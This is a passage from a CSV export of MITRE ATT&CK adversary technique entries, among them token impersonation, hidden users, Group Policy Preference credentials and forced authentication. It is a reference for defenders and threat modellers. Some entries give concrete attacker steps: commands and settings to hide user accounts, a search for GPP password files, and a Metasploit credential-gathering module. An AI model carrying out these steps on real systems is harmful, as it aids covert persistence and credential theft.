Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",Windows,FALSE,FALSE,2020-01-14T01:27:31Z
attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d,2,T1134.001,Token Impersonation/Theft,"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.

When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",Windows,FALSE,FALSE,2020-02-18T16:39:06Z
attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd,2,T1205.001,Port Knocking,"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-07-01T18:23:25Z
attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a,2,T1528,Steal Application Access Token,"Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.

Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.

For example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container’s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)  

Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.(Citation: Cider Security Top 10 CICD Security Risks) If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges. 

In Azure, an adversary who compromises a resource with an attached Managed Identity, such as an Azure VM, can request short-lived tokens through the Azure Instance Metadata Service (IMDS). These tokens can then facilitate unauthorized actions or further access to other Azure services, bypassing typical credential-based authentication.(Citation: Entra Managed Identities 2025)(Citation: SpecterOps Managed Identity 2022)

Token theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. 
 
Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)

Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.","Containers, IaaS, Identity Provider, Office Suite, SaaS",FALSE,FALSE,2019-09-04T15:54:25Z
attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5,2,T1204,User Execution,"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).

While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

Adversaries may also deceive users into performing actions such as:

* Enabling [Remote Access Tools](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary
* Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)
* Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204)
* Coerceing users to copy, paste, and execute malicious code manually(Citation: Reliaquest-execution)(Citation: proofpoint-selfpwn)

For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Tools](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)","Linux, Windows, macOS, IaaS, Containers",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--8c4aef43-48d5-49aa-b2af-c0cd58d30c3d,2,T1564.002,Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. 

In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user’s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) 

Adversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)

On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.","Linux, macOS, Windows",FALSE,FALSE,2020-03-13T20:12:40Z
attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819,2,T1134.003,Make and Impersonate Token,"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.

This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.",Windows,FALSE,FALSE,2020-02-18T18:03:37Z
attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e,2,T1552.006,Group Policy Preferences,"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)

These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>
* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>
",Windows,FALSE,FALSE,2020-02-11T18:43:06Z
attack-pattern--8f104855-e5b7-4077-b1f5-bc3103b41abe,2,T1087.004,Cloud Account,"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.

With authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) 

The AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)","IaaS, Identity Provider, Office Suite, SaaS",FALSE,FALSE,2020-02-21T21:08:36Z
attack-pattern--8f452cb4-cbf4-4522-8b11-448787be95c4,2,T1683.002,Audio-Visual Content,"Adversaries may create or manipulate audio, image, and video content to support targeting and malicious operations. Adversaries may also use synthetic voice recordings, real-time altered audio or video during live interactions, fabricated profile photos and identity documents, or video content depicting fabricated or impersonated individuals.(Citation: Nov AI Threat Tracker)

Content may be produced manually through editing tools, generated using AI-assisted tools, or produced using third-party synthetic services.(Citation: FBI 2025 AI Generate Content)(Citation: Europol Deepfakes) AI-assisted tools have enabled adversaries to produce synthetic media at scale and generate content that is more difficult to identify as inauthentic. 

Audio-visual content produced through these methods may be used in support of other techniques, such as [Phishing](https://attack.mitre.org/techniques/T1660), [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003), [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Social Engineering](https://attack.mitre.org/techniques/T1684), [Financial Theft](https://attack.mitre.org/techniques/T1657), or [Establish Accounts](https://attack.mitre.org/techniques/T1585).",PRE,FALSE,FALSE,2026-03-25T14:28:15Z
attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938,2,T1497.002,User Activity Based Checks,"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017)","Linux, macOS, Windows",FALSE,FALSE,2020-03-06T21:04:12Z
attack-pattern--960c3c86-1480-4d72-b4e0-8c242e84a5c5,2,T1554,Compromise Host Software Binary,"Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.

Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e., [Modify Authentication Process](https://attack.mitre.org/techniques/T1556)).(Citation: Google Cloud Mandiant UNC3886 2024)

An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021)

After modifying a binary, an adversary may attempt to impair defenses by preventing it from updating (e.g., via the `yum-versionlock` command or `versionlock.list` file in Linux systems that use the yum package manager).(Citation: Google Cloud Mandiant UNC3886 2024)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-02-11T18:18:34Z
attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8,2,T1102.003,One-Way Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.","Linux, macOS, Windows, ESXi",FALSE,FALSE,2020-03-14T22:45:52Z
attack-pattern--a009cb25-4801-4116-9105-80a91cf15c1b,2,T1136.003,Cloud Account,"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)

In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.(Citation: Microsoft Entra ID Service Principals) In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation: GCP Service Accounts) While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.(Citation: AWS Instance Profiles)(Citation: AWS Lambda Execution Role)

Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.

Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).","IaaS, SaaS, Office Suite, Identity Provider",FALSE,FALSE,2020-01-29T17:32:30Z
attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776,2,T1048,Exfiltration Over Alternative Protocol,"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 

[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)

Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).","ESXi, IaaS, Linux, macOS, Network Devices, Office Suite, SaaS, Windows",FALSE,FALSE,2017-05-31T21:30:44Z
attack-pattern--a1df809c-7d0e-459f-8fe5-25474bab770b,2,T1678,Delay Execution,"Adversaries may employ various time-based methods to evade detection and analysis. These techniques often exploit system clocks, delays, or timing mechanisms to obscure malicious activity, blend in with benign activity, and avoid scrutiny. Adversaries can perform this behavior within virtualization/sandbox environments or natively on host systems. 

Adversaries may utilize programmatic `sleep` commands or native system scheduling functionality, for example [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053). Benign commands or other operations may also be used to delay malware execution or ensure prior commands have had time to execute properly. Loops or otherwise needless repetitions of commands, such as `ping`, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)","Linux, macOS, Windows",FALSE,FALSE,2025-09-24T18:03:15Z
attack-pattern--a2029942-0a85-4947-b23c-ca434698171d,2,T1056.002,GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).

Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)

Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.","Linux, macOS, Windows",FALSE,FALSE,2020-02-11T18:58:45Z
attack-pattern--a3e1e6c5-9c74-4fc0-a16c-a9d228c17829,2,T1052.001,Exfiltration over USB,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.","Linux, Windows, macOS",FALSE,FALSE,2020-03-11T13:50:11Z
attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0,2,T1531,Account Access Removal,"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials, revoked permissions for SaaS platforms such as Sharepoint) to remove access to accounts.(Citation: Obsidian Security SaaS Ransomware June 2023) Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)

In Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. Accounts could also be disabled by Group Policy. In Linux, the <code>passwd</code> utility may be used to change passwords. On ESXi servers, accounts can be removed or modified via esxcli (`system account set`, `system account remove`).

Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective.","Linux, macOS, Windows, SaaS, IaaS, Office Suite, ESXi",FALSE,FALSE,2019-10-09T18:48:31Z
attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc,2,T1110.004,Credential Stuffing,"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.

Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)","Containers, ESXi, IaaS, Identity Provider, Linux, macOS, Network Devices, Office Suite, SaaS, Windows",FALSE,FALSE,2020-02-11T18:39:59Z
attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52,2,T1036.001,Invalid Code Signature,"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)

Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.","macOS, Windows",FALSE,FALSE,2020-02-10T19:49:46Z
attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2,2,T1187,Forced Authentication,"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.(Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.(Citation: Didier Stevens WebDAV Traffic)(Citation: Microsoft Managing WebDAV Security)

Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary  (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource, it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary-controlled server.(Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials.(Citation: Cylance Redirect to SMB)

There are several different ways this can occur.(Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:

* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request.(Citation: US-CERT APT Energy Oct 2017)
* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.(Citation: US-CERT APT Energy Oct 2017)

Alternatively, by leveraging the <code>EfsRpcOpenFileRaw</code> function, an adversary can send SMB requests to a remote system's MS-EFSRPC interface and force the victim computer to initiate an authentication procedure and share its authentication details. The Encrypting File System Remote Protocol (EFSRPC) is a protocol used in Windows networks for maintenance and management operations on encrypted data that is stored remotely to be accessed over a network. Utilization of <code>EfsRpcOpenFileRaw</code> function in EFSRPC is used to open an encrypted object on the server for backup or restore. Adversaries can collect this data and abuse it as part of a NTLM relay attack to gain access to remote systems on the same internal network.(Citation: Rapid7)(Citation: GitHub)

",Windows,FALSE,FALSE,2018-01-16T16:13:52Z
attack-pattern--bed04f7d-e48a-4e76-bd0f-4c57fe31fc46,2,T1595.003,Wordlist Scanning,"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).

For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  

As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",PRE,FALSE,FALSE,2022-03-04T18:56:38Z
attack-pattern--c2f59d25-87fe-44aa-8f83-e8e59d077bf5,2,T1584.002,DNS Server,"Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.

By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Alternatively, they may be able to prove ownership of a domain to a SaaS service in order to assert control of the service or create a new administrative [Cloud Account](https://attack.mitre.org/techniques/T1136/003).(Citation: CyberCX SaaS Domain Hijacking 2025) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)",PRE,FALSE,FALSE,2020-10-01T00:54:30Z
attack-pattern--c877e33f-1df6-40d6-b1e7-ce70f16f4979,2,T1614,System Location Discovery,"
Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)

Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)","IaaS, Linux, macOS, Windows",FALSE,FALSE,2021-04-01T16:42:08Z
attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213,2,T1557.002,ARP Cache Poisoning,"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

